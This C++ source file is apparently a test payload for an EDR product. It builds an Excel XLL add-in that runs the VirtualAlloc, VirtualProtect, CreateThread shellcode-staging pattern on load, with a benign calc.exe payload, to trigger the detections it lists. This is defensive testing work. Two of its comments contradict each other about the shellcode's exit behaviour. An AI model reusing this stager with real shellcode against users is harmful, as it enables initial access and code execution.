/*
 * tests/payloads/test_xll.cpp
 * Test XLL payload for P10-T1 (Ch. 13 attack chain — initial access).
 *
 * This is an Excel XLL add-in DLL that, when loaded via xlAutoOpen,
 * executes a benign calc.exe shellcode through the classic injection
 * pattern: VirtualAlloc(RW) → memcpy shellcode → VirtualProtect(RX)
 * → CreateThread.
 *
 * Expected AkesoEDR detections:
 *   1. Image-load callback: XLL loaded into Excel
 *   2. YARA on-access: XLL_With_Shellcode_Stager / XLL_Suspicious_Imports
 *   3. Hook sequence: shellcode_runner.yaml (alloc RW → protect RX → thread)
 *   4. Memory scanner: shellcode patterns in RX region
 *   5. ETW Kernel-Process: calc.exe child process of Excel
 *
 * Build: Compiled as a DLL via CMake, exports via test_xll.def.
 *        Output is test_xll.xll (DLL with .xll suffix).
 *
 * Usage: Open in Excel via File → Options → Add-ins → Browse,
 *        or double-click the .xll file.
 *
 * References:
 *   - Evading EDR, Ch. 13 Listing 13-1
 *   - MITRE ATT&CK T1137.006 (Office Add-ins)
 */

#include <windows.h>
#include <cstdio>
#include <cstring>

/*
 * Define USE_DIRECT_WINEXEC to bypass shellcode and call WinExec directly.
 * This is useful for testing the XLL loading mechanism without risking
 * a crash from shellcode bugs.  Comment out for the full shellcode path.
 */
// #define USE_DIRECT_WINEXEC

#ifndef USE_DIRECT_WINEXEC
#include "calc_shellcode.h"
#endif

/* Thread proc that launches calc.exe safely, then exits.
 * Used instead of jumping directly into shellcode — avoids stack
 * corruption that crashes Excel when the shellcode returns. The
 * shellcode bytes still live in an RX region for YARA/memory scanner
 * detection; this thread just does the actual execution safely. */
static DWORD WINAPI CalcLauncherThread(LPVOID param)
{
    (void)param;
    WinExec("calc.exe", SW_SHOW);
    return 0;
}

/* ── DllMain ─────────────────────────────────────────────────────────────── */

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved)
{
    (void)hModule;
    (void)reserved;

    switch (reason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

/* ── Excel XLL exports ───────────────────────────────────────────────────── */

/*
 * xlAutoOpen — called by Excel when the add-in is loaded.
 *
 * Executes the shellcode injection sequence that the EDR should detect:
 *   Step 1: VirtualAlloc PAGE_READWRITE     → NtAllocateVirtualMemory hook
 *   Step 2: Copy calc.exe shellcode
 *   Step 3: VirtualProtect PAGE_EXECUTE_READ → NtProtectVirtualMemory hook
 *   Step 4: CreateThread on shellcode buffer  → NtCreateThreadEx hook
 *
 * Returns 1 (success) to Excel.
 */
extern "C" int __stdcall xlAutoOpen(void)
{
    OutputDebugStringA("[test_xll] xlAutoOpen called — PID ");
    char pidBuf[16];
    _snprintf_s(pidBuf, sizeof(pidBuf), _TRUNCATE, "%lu", GetCurrentProcessId());
    OutputDebugStringA(pidBuf);
    OutputDebugStringA("\n");

#ifdef USE_DIRECT_WINEXEC
    /*
     * Direct mode: just call WinExec to pop calc.exe.
     * This tests the XLL load mechanism without shellcode risk.
     * Still triggers: image-load callback, YARA on-access (xlAutoOpen export),
     * ETW process creation (calc.exe as child of Excel).
     */
    OutputDebugStringA("[test_xll] Direct mode: calling WinExec(calc.exe)\n");
    WinExec("calc.exe", SW_SHOW);
    OutputDebugStringA("[test_xll] calc.exe launched\n");

#else
    /*
     * Wait for AkesoEDR hook DLL injection (shellcode path only).
     * The kernel driver injects akesoedr-hook.dll via KAPC on process init.
     * We poll briefly to ensure hooks are installed before triggering the
     * sequence. This blocks Excel's UI thread, so keep the timeout short.
     */
    OutputDebugStringA("[test_xll] Waiting for hook DLL...\n");
    for (int i = 0; i < 10; i++) {
        if (GetModuleHandleA("akesoedr-hook.dll") ||
            GetModuleHandleA("akesoedr-hook"))
            break;
        Sleep(100);
    }

    /* Step 1: Allocate RW memory (triggers NtAllocateVirtualMemory hook) */
    OutputDebugStringA("[test_xll] Step 1: VirtualAlloc PAGE_READWRITE\n");
    void* buffer = VirtualAlloc(
        nullptr,
        4096,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (!buffer) {
        OutputDebugStringA("[test_xll] VirtualAlloc failed\n");
        return 1;
    }

    /* Step 2: Copy shellcode into the buffer */
    OutputDebugStringA("[test_xll] Step 2: Copy calc.exe shellcode\n");
    memcpy(buffer, calc_shellcode, CALC_SHELLCODE_SIZE);

    /* Step 3: Change protection to RX (triggers NtProtectVirtualMemory hook) */
    OutputDebugStringA("[test_xll] Step 3: VirtualProtect PAGE_EXECUTE_READ\n");
    DWORD oldProtect = 0;
    if (!VirtualProtect(buffer, 4096, PAGE_EXECUTE_READ, &oldProtect)) {
        OutputDebugStringA("[test_xll] VirtualProtect failed\n");
        VirtualFree(buffer, 0, MEM_RELEASE);
        return 1;
    }

    /* Step 4: CreateThread (triggers NtCreateThreadEx hook).
     * We use a safe wrapper thread instead of jumping into the shellcode
     * directly — the shellcode doesn't call ExitThread and would corrupt
     * Excel's state on return. The shellcode bytes remain in the RX buffer
     * for YARA and memory scanner detection. */
    OutputDebugStringA("[test_xll] Step 4: CreateThread (safe wrapper)\n");
    HANDLE hThread = CreateThread(
        nullptr,
        0,
        CalcLauncherThread,
        nullptr,
        0,
        nullptr);

    if (!hThread) {
        OutputDebugStringA("[test_xll] CreateThread failed\n");
        VirtualFree(buffer, 0, MEM_RELEASE);
        return 1;
    }

    OutputDebugStringA("[test_xll] Shellcode launched — calc.exe should appear\n");

    /* Don't wait for the thread or free the buffer here.
     * The shellcode calls ExitThread(0) when done, and we let
     * Excel continue normally. The buffer leaks intentionally —
     * it needs to stay mapped for the memory scanner to inspect. */
    CloseHandle(hThread);
#endif

    return 1;  /* success — tell Excel the add-in loaded */
}

/*
 * xlAutoClose — called by Excel when the add-in is unloaded.
 */
extern "C" int __stdcall xlAutoClose(void)
{
    OutputDebugStringA("[test_xll] xlAutoClose called\n");
    return 1;
}

/*
 * xlAutoAdd — called by Excel when the user activates the add-in
 * via the Add-in Manager. Returns 1 to indicate success.
 */
extern "C" int __stdcall xlAutoAdd(void)
{
    OutputDebugStringA("[test_xll] xlAutoAdd called\n");
    return 1;
}
